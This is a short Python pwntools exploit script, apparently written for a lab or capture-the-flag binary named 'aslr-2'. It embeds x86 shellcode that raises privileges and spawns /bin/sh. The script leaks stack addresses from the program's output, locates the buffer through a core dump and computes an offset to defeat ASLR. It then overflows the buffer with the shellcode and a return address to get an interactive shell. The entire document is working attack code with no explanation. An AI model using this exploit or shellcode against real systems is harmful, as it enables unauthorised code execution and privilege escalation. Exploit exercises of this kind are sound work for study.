from pwn import *

SHELLCODE ='\xb8\xca\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x80\x89\xc3\x89\xc1\xb8\xcc\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x801\xc0Phn/shh//bi\x89\xe31\xc91\xd2\xb8\x1b\x11\x11\x11\xc1\xe0\x1c\xc1\xe8\x1c\xcd\x80'

ARG1 = ''
ENV = {}
OFFSET = 0x00

# ENV = {'SHELLCODE': SHELLCODE}
# ARG1 = SHELLCODE

p = process(["aslr-2", ARG1], env=ENV)

# Parse out addresses from stdout
data = p.recvuntil("name:")
add_array = data.split('\n')[1].split(':')[1].split(' ')
add_array = [int(a, 16) for a in add_array if len(a) > 0 and (not 'nil' in a)]
print(add_array)

# Find buffer address
p.send(SHELLCODE + 'a' * 1000)
p.wait()
c = Core("./core")
buffer_addr = c.stack.find(SHELLCODE)
print(hex(buffer_addr))

# Find offset between address and the buffer
offset = [addr - buffer_addr for addr in add_array]

p = process(["aslr-2", ARG1], env=ENV)

# Find addresses from the new process
data = p.recvuntil("name:")
add_array = data.split('\n')[1].split(':')[1].split(' ')
add_array = [int(a, 16) for a in add_array if len(a) > 0 and (not 'nil' in a)]
print(add_array)

# Use old offset to calculate buffer address and attack
buffer_addr = add_array[1] - offset[1]
inp = SHELLCODE + "a" * (0x88+4 - len(SHELLCODE)) + p32(buffer_addr)
p.send(inp)
p.interactive()
